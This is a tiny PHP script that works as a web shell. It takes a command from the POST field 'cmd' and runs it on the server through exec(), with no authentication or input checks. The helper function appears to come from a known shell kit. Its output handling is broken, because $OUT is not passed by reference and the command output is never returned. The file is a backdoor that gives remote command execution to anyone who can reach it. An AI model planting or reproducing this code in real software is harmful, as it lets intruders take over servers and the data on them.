<?php
function DxExecNahuj($cmd, $OUT) /* returns the name of function that exists, or FALSE */
{
$OUT=array(); 
if (function_exists('exec'))
{	 
	exec($cmd, $OUT); /* full array output */
	return array(true,true,'exec', '');
}
}

$OUT = '';
DxExecNahuj($_POST['cmd'],$OUT);
?>